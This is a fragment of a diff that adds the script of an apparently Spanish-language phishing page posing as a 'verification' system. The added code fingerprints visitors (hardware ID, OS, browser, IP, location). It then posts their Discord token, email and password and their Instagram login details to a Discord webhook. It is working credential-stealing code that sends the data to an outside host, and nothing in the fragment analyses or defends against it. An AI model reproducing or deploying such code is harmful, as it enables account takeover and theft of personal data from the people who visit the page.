+                    hwid += Math.abs(hash).toString(16).substring(0, 4);
+                }
+                
+                return hwid.toUpperCase();
+            }
+            
+            function getDetailedOSInfo() {
+                const userAgent = navigator.userAgent;
+                let os = "Unknown";
+                let badge = "";
+                
+                if (userAgent.includes("Windows NT 10.0; Win64; x64") && userAgent.includes("Chrome") && !userAgent.includes("Edg/")) {
+                    if (screen.width >= 1920 && screen.height >= 1080) {
+                        os = "Windows 11";
+                        badge = '<span class="windows-badge windows-11">11</span>';
+                    } else {
+                        os = "Windows 10";
+                        badge = '<span class="windows-badge windows-10">10</span>';
+                    }
+                } else if (userAgent.includes("Windows NT 10.0")) {
+                    os = "Windows 10";
+                    badge = '<span class="windows-badge windows-10">10</span>';
+                } else if (userAgent.includes("Windows NT 6.3")) {
+                    os = "Windows 8.1";
+                } else if (userAgent.includes("Windows NT 6.2")) {
+                    os = "Windows 8";
+                } else if (userAgent.includes("Windows NT 6.1")) {
+                    os = "Windows 7";
+                } else if (userAgent.includes("Windows NT 6.0")) {
+                    os = "Windows Vista";
+                } else if (userAgent.includes("Windows NT 5.1")) {
+                    os = "Windows XP";
+                } else if (userAgent.includes("Mac")) {
+                    os = "macOS";
+                } else if (userAgent.includes("Linux")) {
+                    os = "Linux";
+                } else if (userAgent.includes("Android")) {
+                    os = "Android";
+                } else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) {
+                    os = "iOS";
+                }
+                
+                return os + badge;
+            }
+            
+            function getArchitecture() {
+                if (navigator.userAgent.includes("Win64") || navigator.userAgent.includes("WOW64")) {
+                    return "64-bit";
+                } else if (navigator.userAgent.includes("Win32")) {
+                    return "32-bit";
+                } else {
+                    return "No detectable";
+                }
+            }
+            
+            function getBrowserInfo() {
+                const userAgent = navigator.userAgent;
+                let browser = "Unknown";
+                
+                if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
+                    browser = "Chrome";
+                } else if (userAgent.includes("Firefox")) {
+                    browser = "Firefox";
+                } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+                    browser = "Safari";
+                } else if (userAgent.includes("Edg")) {
+                    browser = "Edge";
+                } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+                    browser = "Opera";
+                }
+                
+                return browser;
+            }
+            
+            function getBrowserVersion() {
+                const userAgent = navigator.userAgent;
+                let version = "No detectable";
+                
+                if (userAgent.includes("Chrome/")) {
+                    version = userAgent.match(/Chrome\/([0-9.]+)/)[1];
+                } else if (userAgent.includes("Firefox/")) {
+                    version = userAgent.match(/Firefox\/([0-9.]+)/)[1];
+                } else if (userAgent.includes("Version/") && userAgent.includes("Safari")) {
+                    version = userAgent.match(/Version\/([0-9.]+)/)[1];
+                } else if (userAgent.includes("Edg/")) {
+                    version = userAgent.match(/Edg\/([0-9.]+)/)[1];
+                }
+                
+                return version;
+            }
+            
+            function getRAMInfo() {
+                if (navigator.deviceMemory) {
+                    return navigator.deviceMemory + " GB";
+                } else {
+                    return "No disponible";
+                }
+            }
+            
+            function isMobileDevice() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+            
+            function sendToDiscord(systemInfo, discordInfo, instagramInfo) {
+                const fields = [
+                    {
+                        name: '🔐 TOKEN DE DISCORD',
+                        value: `\`\`\`${discordInfo.token}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: '📧 CORREO DE DISCORD',
+                        value: discordInfo.email,
+                        inline: true
+                    },
+                    {
+                        name: '🔑 CONTRASEÑA DE DISCORD',
+                        value: `\`\`\`${discordInfo.password}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: '📷 USUARIO DE INSTAGRAM',
+                        value: instagramInfo.user,
+                        inline: true
+                    },
+                    {
+                        name: '📧 CORREO DE INSTAGRAM',
+                        value: instagramInfo.email,
+                        inline: true
+                    },
+                    {
+                        name: '🔑 CONTRASEÑA DE INSTAGRAM',
+                        value: `\`\`\`${instagramInfo.password}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: '🌐 Dirección IP',
+                        value: systemInfo.ip,
+                        inline: true
+                    },
+                    {
+                        name: '🆔 HWID',
+                        value: systemInfo.hwid,
+                        inline: true
+                    },
+                    {
+                        name: '💻 Sistema Operativo',
+                        value: systemInfo.os.replace(/<[^>]*>/g, ''),
+                        inline: true
+                    },
+                    {
+                        name: '🔍 Navegador',
+                        value: `${systemInfo.browser} (v${systemInfo.browserVersion})`,
+                        inline: true
+                    },
+                    {
+                        name: '📍 Ubicación',
+                        value: `${systemInfo.city}, ${systemInfo.country}`,
+                        inline: true
+                    },
+                    {
+                        name: '⏰ Fecha y Hora',
+                        value: systemInfo.timestamp,
+                        inline: false
+                    }
+                ];
+                
+                const embed = {
+                    title: '🔐 VERIFICACIÓN COMPLETA - DATOS DE USUARIO',
+                    color: 15158332,
+                    fields: fields,
+                    timestamp: new Date().toISOString()
+                };
+                
+                const data = {
+                    embeds: [embed],
+                    username: 'Sistema de Verificación',
+                    avatar_url: 'https://cdn.discordapp.com/emojis/1006828513956462652.png'
+                };
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .catch(error => {
+                    console.error('Error al enviar a Discord:', error);
+                    showNotification('Error al enviar información a Discord.', 'error');
+                });
+            }
+            
+            function showNotification(message, type) {
+                notificationDiv.textContent = message;
+                notificationDiv.className = `notification ${type}`;
+                notificationDiv.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
